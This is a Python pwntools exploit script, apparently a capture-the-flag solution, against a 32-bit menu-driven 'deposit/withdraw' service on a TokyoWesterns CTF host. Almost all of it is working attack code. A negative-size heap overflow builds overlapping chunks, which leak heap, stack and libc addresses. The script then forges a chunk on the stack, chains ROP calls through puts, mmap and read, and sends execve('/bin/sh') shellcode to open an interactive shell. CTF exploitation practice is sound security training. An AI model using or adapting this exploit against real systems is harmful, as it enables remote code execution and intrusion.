#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "pwn1.chal.ctf.westerns.tokyo"
port = 35187
r = remote(host,port)


def deposit(mount,size,data,pad = None):
    r.recvuntil(">")
    if pad :
        r.sendline("1" + pad)
    else :
        r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(mount))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

def withdraw(mount,size,data):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(mount))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

def trans(mount,dest):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(mount))
    r.recvuntil(":")
    r.sendline(dest)

def show():
    r.recvuntil(">")
    r.sendline("4")

r.recvuntil(":")
r.sendline("dada\x00" + "D"*24)
deposit(0,0x20,"orangen")
deposit(0,-1,"orangen") # heap overflow
deposit(0,-1,"a"*0x1c + p32(0xe9)) # Construct a overlap chunk with ptr, you can use it to leak stack and heap.
show() 
r.recvuntil(" [DEPOSIT]")
heap = u32(r.recvuntil(":")[:-1].strip()) -0xd0
print "heap:",hex(heap)
stack = int(r.recvuntil("yen")[:-3].strip()) + 2**32
print "stack:", hex(stack)
r.recvuntil("Exit")
buf = stack - 0x40
deposit(heap+0x9c,128,"a"*104 + p32(0x9d)) # fixed the chunk
deposit(heap+0x9c,-1,"a"*0x1c + p32(0x11)  + p32(heap+0x130) + p32(stack-56-4+0x14) + ("d"*0x4 + p32(0x7d) + p32(heap+0x118) + p32(stack-0x2c)).ljust(0x70,"d") + p32(0x11) + p32(heap+0x1b8) + p32(heap+0x9c) + "a"*0x4 + p32(0xa1) + p32(heap+0x1b8) + p32(heap+0x9c) + "a"*0xc + p32(0x61) + p32(heap+0x1b8) + p32(heap+0x8c) + "k"*0x54 + p32(0x28)+ p32(buf) + p32(buf) +"k"*0x1c + p32(0xe39) + p32(buf) + p32(heap+0x130),pad  = "a"*0x2f + p32(0xfe0) + p32(heap) + p32(heap+0x1b8)) # Construct a chunk on stack

puts = 0x8048410
puts_got = 0x08049fd4
leave_ret = 0x0804854c
read = 0x8048428
rop = flat([stack-0x8,puts,leave_ret,puts_got,stack+32,read,0x43434343,0,stack,0x100])
deposit(0,0xfc0,p32(heap+0x188) + p32(heap+0x190) + "f"*0x10 + p32(heap+0x134) + "c"*8 + rop ,"a"*0x2f + p32(0xfe0) + p32(heap+0x190) + p32(heap+0x21c)) # get the chunk on stack

r.recvuntil("success!")
r.recvuntil("\n")
libc = u32(r.recvuntil("\n")[:4]) - 0xcc7
print "libc:",hex(libc)
mmap = libc + 0x153d
rop2 = flat([mmap,0x45454545,0x46464646,0x47474747,0x48484848,read,0x41414000,0,0x41414000,0x1000,0x41414000,0x1000,7,34,-1,0])
r.sendline(rop2)
sc = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
r.sendline(sc)
r.interactive()
